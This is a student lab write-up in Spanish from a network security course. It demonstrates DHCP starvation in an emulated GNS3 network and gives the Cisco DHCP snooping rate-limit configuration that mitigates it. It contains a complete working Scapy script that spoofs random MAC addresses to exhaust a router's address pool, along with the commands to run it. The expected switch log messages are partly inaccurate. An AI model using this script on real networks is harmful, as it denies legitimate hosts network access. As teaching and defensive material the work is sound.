
---

# 🛡️Security Audit: DHCP Starvation (IP Pool Exhaustion)

---
<p align="center">
  <img src="https://img.shields.io/badge/Platform-GNS3-blue?style=for-the-badge&logo=virtualbox&logoColor=white" alt="GNS3 Platform">
  <img src="https://img.shields.io/badge/Language-Python%203-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3">
  <img src="https://img.shields.io/badge/Library-Scapy-red?style=for-the-badge&logo=scapy&logoColor=white" alt="Scapy">
  <img src="https://img.shields.io/badge/Status-Mitigated-success?style=for-the-badge" alt="Status Mitigated">
</p>

## 📝 Información del Estudiante

* **Institución:** Instituto Tecnológico de Las Américas (ITLA)
* **Asignatura:** Seguridad de Redes
* **Auditor Técnico:** Zoe Daniela Bobonagua Acevedo
* **Matrícula:** 2025-0839
* **Evidencia Audiovisual:** [▶️ Video aqui ](https://youtu.be/Qu0d3xQ5xxY?si=RTRoHwC9lYd_sr8t)

---

## 🎯 1. Objetivo del Laboratorio

El propósito fundamental de esta auditoría es evaluar el comportamiento del servicio de asignación dinámica de direccionamiento (**DHCP**) ejecutado en un enrutador Cisco ante un escenario de agotamiento malicioso de recursos. La práctica demuestra cómo un atacante puede saturar el espacio de direccionamiento disponible (*Scope Pool Pool Exhaustion*) falsificando identidades de hardware de manera masiva, provocando una denegación de servicio (DoS) para los nuevos hosts legítimos de la red, y validando los mecanismos de inspección perimetral mediante **DHCP Snooping Rate Limiting**.

---

## 📐 2. Arquitectura de la Red Emulada

La infraestructura física y lógica fue replicada en **GNS3** operando bajo el segmento IP personalizado `10.25.83.0/24`.

### Diagrama de Flujo Lógico

```text
                      +-----------------------+
                      |    R1 (Cisco IOSv)    |
                      |   Gateway & DHCP Srv  |
                      +-----------------------+
                                  | f0/0
                                  |
                                  | Gi0/1
                      +-----------------------+
                      |  SW1 (Cisco IOSv-L2)  |
                      |   Core / STP Root     |
                      +-----------------------+
                                  | Gi0/2
                                  |
                                  | Gi0/2
                      +-----------------------+
                      |  SW2 (Cisco IOSv-L2)  |
                      |     Access Switch     |
                      +-----------------------+
                         | Gi0/3           | Gi1/0
                         |                 |
                         | e0              | e0
          +--------------------+     +--------------------+
          |    kali-1 (VM)     |     |     PC1 (VPCS)     |
          |  Auditor Estático  |     |   Cliente Dinámico |
          +--------------------+     +--------------------+

```

### Cuadro de Direccionamiento e Interfaces

| Dispositivo | Interfaz Física | Tipo de Enlace | Dirección IP | Máscara de Red | Default Gateway | Segmento VLAN |
| --- | --- | --- | --- | --- | --- | --- |
| **R1** | f0/0.83 | Subinterfaz | 10.25.83.1 | 255.255.255.0 | N/A | VLAN 83 (Data) |
| **R1** | f0/0.99 | Subinterfaz | 10.25.99.1 | 255.255.255.0 | N/A | VLAN 99 (Nativa) |
| **SW1** | Vlan99 | Virtual SVI | 10.25.99.11 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **SW2** | Vlan99 | Virtual SVI | 10.25.99.12 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **kali-1** | eth0 | Acceso Estático | 10.25.83.99 | 255.255.255.0 | 10.25.83.1 | VLAN 83 (Data) |
| **PC1** | e0 | Acceso Dinámico | Asignada DHCP | 255.255.255.0 | 10.25.83.1 | VLAN 83 (Data) |

---

## 💻 3. Documentación Técnica del Script (`dhcp_starvation.py`)

### Análisis Operativo del Código

El script interactúa a bajo nivel inyectando tramas de difusión estructuradas en dos fases secuenciales por cada ciclo:

1. **DHCP Discover:** Envía una solicitud inicial utilizando una dirección MAC de origen aleatoria (`RandMAC()`) tanto en la capa de enlace (Ethernet) como dentro de la carga útil de BOOTP (`chaddr`), simulando la presencia de un nuevo dispositivo físico en el segmento.
2. **DHCP Request Inmediato:** Sin esperar la respuesta del servidor, el script autogenera y despacha inmediatamente un mensaje `Request` atado al ID de transacción (`xid`) y apuntando al Server ID del Router (`10.25.83.1`). Esto fuerza de manera agresiva al sistema operativo Cisco IOSv a registrar y reservar la dirección IP en su tabla de asignaciones activas, consumiendo el pool completo en pocos segundos.

### Código de la Herramienta

```python
#!/usr/bin/env python3
import sys
import time
import random
from scapy.all import *

interface = "eth0"
limite_peticiones = 10  # Número de IPs que vas a agotar
pausa = 0.5            # Pausa para que el router procese

print(f"[*] Iniciando DHCP Starvation Completo para Cisco en {interface}...")

try:
    for i in range(1, limite_peticiones + 1):
        # 1. Crear identidad del cliente fantasma
        fake_mac = RandMAC()
        fake_mac_bytes = bytes.fromhex(fake_mac.replace(":", ""))
        fake_xid = random.randint(1, 900000000)
        
        print(f"\n[+] [{i}/{limite_peticiones}] Atacando con MAC: {fake_mac}")
        
        # 2. ENVIAR DISCOVER
        discover = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, xid=fake_xid, chaddr=fake_mac_bytes + b"\x00" * 10) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(discover, iface=interface, verbose=False)
        
        # Esperar un instante corto a que el router genere la oferta
        time.sleep(0.1)
        
        # 3. ENVIAR REQUEST INMEDIATO (Simula que el cliente acepta la IP de la subred)
        # Forzamos al router a creer que el cliente ya tomó la IP para que la registre en su tabla
        request = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, xid=fake_xid, chaddr=fake_mac_bytes + b"\x00" * 10) /
            DHCP(options=[
                ("message-type", "request"),
                ("server_id", "10.25.83.1"), # IP de tu router
                "end"
            ])
        )
        sendp(request, iface=interface, verbose=False)
        
        time.sleep(pausa)

    print("\n[+] Ráfaga completada. Revisa la tabla de asignaciones en el router.")

except KeyboardInterrupt:
    print("\n[-] Ataque detenido.")
    sys.exit(0)

```

---

## 🚀 4. Guía de Ejecución y Diagnóstico de Anomalías

### Paso 1: Verificar el Estado Inicial del Servidor DHCP

Acceda a la consola del enrutador Gateway (**R1**) y verifique el estado del pool de direcciones y las asignaciones actuales de la VLAN 83:

```text
R1# show ip dhcp binding
R1# show ip dhcp pool

```

### Paso 2: Lanzamiento de la Ráfaga de Agotamiento

Desde la interfaz de Kali Linux (`kali-1`), asigne permisos operativos de ejecución al script y despliéguelo con privilegios elevados:

```bash
chmod +x dhcp_starvation.py
sudo ./dhcp_starvation.py

```

### Paso 3: Confirmación de Denegación de Servicio (DoS)

1. Regrese a la consola de **R1** y verifique cómo la base de datos se ha inundado con las identidades falsas generadas por Scapy:
```text
R1# show ip dhcp binding

```


2. Intente solicitar una dirección IP dinámica desde la consola de la estación legítima **PC1**:
```text
PC1> ip dhcp

```


*Diagnóstico esperado:* La VPCS se quedará colgada enviando solicitudes sin recibir respuesta (*"DHCP server not responding"*), confirmando el agotamiento total del pool de red.

---

## 🛠️ 5. Plan de Mitigación e Ingeniería de Hardening

> [!IMPORTANT]
> Para neutralizar por completo el DHCP Starvation, el Switch de Acceso debe validar los paquetes DHCP entrantes por puertos no confiables mediante **DHCP Snooping** y restringir la tasa máxima de paquetes por segundo permitida utilizando **Rate Limiting**.

### Configuración Defensiva (Copiar y pegar en SW2)

Aplique el siguiente bloque de comandos en el Switch perimetral (**SW2**) para restringir las interfaces orientadas a los usuarios finales:

```text
configure terminal
!
! 1. Activación de la inspección global en la VLAN de producción
ip dhcp snooping
ip dhcp snooping vlan 83
no ip dhcp snooping information option
!
! 2. Configurar el puerto Troncal de subida como enlace de confianza (Trust)
interface GigabitEthernet0/2
 ip dhcp snooping trust
exit
!
! 3. Limitar de forma estricta la tasa de paquetes DHCP en los accesos
interface range GigabitEthernet0/3 , GigabitEthernet1/0
 description DEFENSE_DHCP_STATION
 ip dhcp snooping limit rate 5
end

```

### Comprobación de la Eficiencia de la Defensa

Cuando el script de Scapy intente generar la ráfaga masiva desde la máquina Kali conectada a `Gi0/3`, el tráfico DHCP superará inmediatamente el umbral de seguridad configurado (`limit rate 5` paquetes por segundo). El switch **SW2** interpretará este comportamiento anómalo como una anomalía operativa, descartará los paquetes excesivos e inhabilitará el puerto de manera preventiva:

```text
%DHCP_SNOOPING-4-NOSPACE: DHCP Snooping packet rate limit exceeded on Gi0/3
%LINK-5-CHANGED: Interface GigabitEthernet0/3, changed state to administratively down

```

El pool de direcciones del router **R1** se mantendrá protegido y disponible, permitiendo que **PC1** obtenga su direccionamiento IP de manera normal e ininterrumpida.

---

## ⚖️ 6. Aviso de Uso Académico

Este repositorio se ha estructurado bajo pautas estrictamente académicas para complementar los objetivos de laboratorio de la asignatura de **Seguridad de Redes** en el **ITLA**. El uso indebido de estas herramientas de auditoría en infraestructuras corporativas ajenas es considerado una violación grave de los estándares éticos y legales vigentes en materia de delitos de alta tecnología.
